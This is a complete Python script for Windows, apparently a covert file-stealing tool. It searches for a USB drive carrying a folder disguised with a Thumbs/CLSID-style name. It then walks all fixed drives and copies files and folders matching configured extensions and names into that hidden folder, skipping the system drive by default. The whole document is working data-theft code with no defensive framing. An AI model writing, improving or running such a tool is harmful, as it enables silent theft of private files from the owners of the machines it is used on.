from sys import stdout
from time import sleep
from os import walk, chdir, listdir, sep, environ, path, makedirs
from shutil import copyfile, copytree
from time import localtime
from win32api import GetLogicalDrives
from win32file import GetDriveType, DRIVE_FIXED, DRIVE_REMOVABLE

class Mains:
    def __init__(self):
        filess = listdir('.')
        if "types.txt" in filess :
            file = open('types.txt')
            reader = file.readlines()
            listertype = reader[0].replace(" ","").replace("type=", "").split(",")
            listerfile = reader[1].replace(" ","").replace("file=", "").split(",")
            listerfolder = reader[2].replace(" ","").replace("folder=", "").split(",")
            reader[3] = reader[3].replace(" ","").replace("search_OS_drive=","")

            listertypes = []
            x = 0
            while x < len(listertype):
                if listertype[x] != "\n":
                    listertypes.append("." + listertype[x].replace("\n", ""))
                x += 1

            listerfiles = []
            y = 0
            while y < len(listerfile):
                if listerfile[y] != "\n":
                    listerfiles.append(listerfile[y].replace("\n", ""))
                y += 1

            listerfolders = []
            z  = 0
            while z < len(listerfolder):
                if listerfolder[z] != "\n":
                    listerfolders.append(listerfolder[z].replace("\n", ""))
                z += 1

            self.folders = listerfolders

            filetype = listertypes + listerfiles
            self.filetype = list(filter(None, filetype))

            self.oser = "NO-os"
            if reader[3] == "yes":
                self.oser = "Yes-os"
        else:
            print("no *type.txt* file !!!")

    def usb_finder(self):
        self.usb_list = []
        self.dest = ""
        drivebits = GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = GetDriveType(drname)
                if t == DRIVE_REMOVABLE:
                    self.usb_list.append(drname)

        if self.usb_list.__len__() == 0 :
            print("No USB Connected!!!")
            sleep(4)
            exit()

        favorite = ".Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}"

        for usb in self.usb_list:

            chdir(usb)
            if favorite in listdir('.'):
                self.dest = usb + "\\" + favorite + "\\"
        if self.dest == "":
            print("No F-USB!!!")
            sleep(4)
            exit()

    def drives(self):
        win = environ['SYSTEMDRIVE'] + "\\"

        self.drive_list = []
        drivebits = GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = GetDriveType(drname)
                if t == DRIVE_FIXED:
                    self.drive_list.append(drname)

## region OS:
        if self.oser == "NO-os":
            for i in self.drive_list:
                if i == win :
                    self.drive_list.remove(i)
## endregion

        for driver in self.drive_list:
            self.copier(driver)

    def copier(self,driver):
            self.counter = 0
            chdir(driver)

            filetypes = self.filetype       #['.bmpsa', '.bmpas']
            folder = self.folders

            # destination = "D:\\MY Projects"

            for (dirpath, dirname, filenames) in walk('.'):
                if folder != [] :
                    for dir in dirname :
                        for fold in folder :
                            if dir.endswith(folder[folder.index(fold)]):
                                main_location = sep.join([dirpath, fold])

                                timemin = str(localtime().tm_min)
                                timesec = str(localtime().tm_sec)

                                time = " (m" + timemin + "-s" + timesec + ")"

                                absulpath = path.abspath(main_location).replace(":", "")
                                absulpath = absulpath[:absulpath.rfind("\\")] + "\\"
                                # print(absulpath)

                                if dir in listdir(self.dest):
                                    dir = dir.replace(folder[folder.index(fold)], "")

                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copytree(main_location,self.dest + absulpath + dir + time + folder[folder.index(fold)])
                                    # print(main_location)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' + str(self.counter))

                                else:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copytree(main_location, self.dest + absulpath + dir)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' + str(self.counter))

                if filenames != []:
                    for filename in filenames:
                        for typefile in filetypes:
                            if filename.endswith(filetypes[filetypes.index(typefile)]):
                                main_location = sep.join([dirpath,filename])

                                timemin = str(localtime().tm_min)
                                timesec = str(localtime().tm_sec)

                                time = " (m" + timemin + "-s" + timesec + ")"

                                absulpath = path.abspath(main_location).replace(":","")
                                absulpath = absulpath[:absulpath.rfind("\\")] + "\\"
                                # print(absulpath)

                                if filename in listdir(self.dest):
                                    filename = filename.replace(filetypes[filetypes.index(typefile)],"")

                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location, self.dest + absulpath+ filename + time +filetypes[filetypes.index(typefile)])
                                    # print(main_location)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r'+str(self.counter))

                                else:
                                    makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                                    copyfile(main_location, self.dest +absulpath+ filename)
                                    self.counter += 1
                                    # print(counter)
                                    stdout.write('\r' +str(self.counter))

M = Mains()
M.usb_finder()
M.drives()
print(".")
# input()